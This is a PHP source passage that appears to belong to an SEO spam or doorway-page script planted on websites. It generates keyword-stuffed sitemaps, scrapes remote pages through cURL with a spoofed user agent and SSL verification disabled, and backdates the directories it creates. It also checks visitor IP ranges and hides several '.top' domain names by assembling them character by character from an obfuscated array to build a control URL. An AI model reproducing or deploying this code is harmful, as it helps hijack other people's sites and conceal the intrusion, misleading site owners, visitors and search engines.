	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}


  
function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}elseif(strstr($values, "..")){
				
				// echo $urlInfo['host'];				// echo str_replace(basename($url),"",$url);				// die();				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}
		}
	}	
	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);	
	// print_r($matches[1]);	
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}elseif(strstr($values, "..")){
				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}
		}
	}
	return $str;}
function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');
	$encode = mb_detect_encoding($str, $list);	// echo $encode;die();	
	if($encode == 'UTF-8'){
		return $str;	}else{
		return mb_convert_encoding($str, $charset, $encode);	}
	 
}
function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');	$str = file_get_contents($file);	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);		if (md5($tmp) == md5($str)) {
		
			return $item;		}
	}
	return null;}
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 

function curl_getjs_from_webpage($url,$time){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_TIMEOUT => $time,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_TIMEOUT, $time);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}

function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
//



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}
		
	
	function getalink($sid,$pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;		}
		
		$SidWz = $sid % $keyNum;		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';			
			}
			$linkCenter .= $linkCenter . "#llq";		
			$linkCenter = str_replace('-#llq','',$linkCenter);	
			$linkCenter = str_replace('#llq','',$linkCenter);
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);				
			return $filePres.$linkCenter;		
			}
		
		
		
		
		if($ms == 1){
			for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 2){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
				

				if($i == $fg-1){
					// $linkCenter .= '/';				
					$linkCenter .= '-';				
				}
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 3){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);			
			
		}elseif($ms == 4){
				for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	

				if($i == $fg-1){
				// $linkCenter .= '/';				
					$linkCenter .= '-';			
					}
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-/","/",$linkCenter);			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);		}
		
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);	
			
		return $filePres.$linkCenter;
	}
	
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';
		$str = preg_replace($rulers,'',$str);
		return $str;
	
	}
  
  
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
	
	$rulers = '#<'.$tagname.'[^>]*>#i';
	$str = preg_replace($rulers,'',$str);
	$rulers = '#</'.$tagname.'>#i';
	$str = preg_replace($rulers,'',$str);
	return $str;
	
	}
	
	
	
// 

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:-";
    return ($str);
} 


 
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{0}.$O00O0O{20}.$O00O0O{19}.$O00O0O{14}.$O00O0O{18}.$O00O0O{4}.$O00O0O{3}.$O00O0O{11}.$O00O0O{4}.$O00O0O{2}.$O00O0O{63}.$O00O0O{19}.$O00O0O{14}.$O00O0O{15};$arr[1]=$O00O0O{10}.$O00O0O{0}.$O00O0O{12}.$O00O0O{4}.$O00O0O{11}.$O00O0O{14}.$O00O0O{19}.$O00O0O{18}.$O00O0O{63}.$O00O0O{19}.$O00O0O{14}.$O00O0O{15};$arr[2]=$O00O0O{17}.$O00O0O{20}.$O00O0O{6}.$O00O0O{1}.$O00O0O{24}.$O00O0O{2}.$O00O0O{7}.$O00O0O{14}.$O00O0O{11}.$O00O0O{4}.$O00O0O{19}.$O00O0O{63}.$O00O0O{19}.$O00O0O{14}.$O00O0O{15};$arr[3]=$O00O0O{22}.$O00O0O{4}.$O00O0O{6}.$O00O0O{14}.$O00O0O{1}.$O00O0O{4}.$O00O0O{24}.$O00O0O{14}.$O00O0O{13}.$O00O0O{3}.$O00O0O{63}.$O00O0O{19}.$O00O0O{14}.$O00O0O{15};$arr[4]=$O00O0O{21}.$O00O0O{5}.$O00O0O{11}.$O00O0O{14}.$O00O0O{20}.$O00O0O{17}.$O00O0O{8}.$O00O0O{18}.$O00O0O{63}.$O00O0O{19}.$O00O0O{14}.$O00O0O{15};
	return $arr;
}
	
function getthisdom(){
	$myArrs = getarr();
    return 'http://www.'.$myArrs[CENTERKEY].MYDIR;
} 
 
 
 
function get_real_ip(){
	
	$ip=false;	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
		$ip = $_SERVER["HTTP_CLIENT_IP"];	}
	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);		if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
		
		for ($i = 0; $i < count($ips); $i++) {
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
				$ip = $ips[$i];				break;			}
		}
	}
	
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);}
 
//file end
